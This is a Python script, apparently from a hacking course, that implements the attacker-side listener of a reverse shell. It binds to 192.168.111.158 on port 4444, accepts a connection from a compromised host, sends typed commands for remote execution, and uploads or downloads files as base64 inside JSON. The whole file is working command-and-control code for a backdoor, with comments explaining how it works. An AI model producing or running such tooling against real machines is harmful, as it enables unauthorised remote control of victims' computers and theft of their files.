#!/usr/bin/env python
import base64
import socket
import json

# Enables the option to reuse sockets.
# When a connection is lost or disconnected, we reuse the socket we created to establish a new connection.
# Backlog refers to the number of connections the system can queue before rejecting them.
class Listener :
    def __init__(self,ip,port) :
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections.")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self,command) :
        # Changed data type from traditional types to JSON types
        json_data = json.dumps(command).encode('cp949')
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try :
                json_data = json_data + self.connection.recv(1024).decode('cp949')
                return json.loads(json_data)
            except ValueError :
                continue
    def execute_remotly(self, command) :
        self.reliable_send(command)
        if command[0] == "exit" :
            self.connection.close()
            exit()
        return self.reliable_receive()
    def file_write(self,path,text) :
        with open(path,"wb") as file :
            file.write(base64.b64decode(text))
            return "[+] Download successful."

    def file_read(self,path) :
        with open(path,"rb") as file :
            return base64.b64encode(file.read())
    def run(self) :
        while True :
            command = input(">> ")
            command = command.split(" ")
            try :
                if command[0].lower() == "upload" :
                    file_text = self.file_read(command[1])
                    command.append(file_text.decode('cp949'))
                result = self.execute_remotly(command)
                if command[0].lower() == "download" and "[-] Error " not in result:
                    result = self.file_write(command[1],result.encode('cp949'))
            except Exception :
                result = "[-] Error during command execution."
            print(result)
my_listener = Listener("192.168.111.158",4444)
my_listener.run()
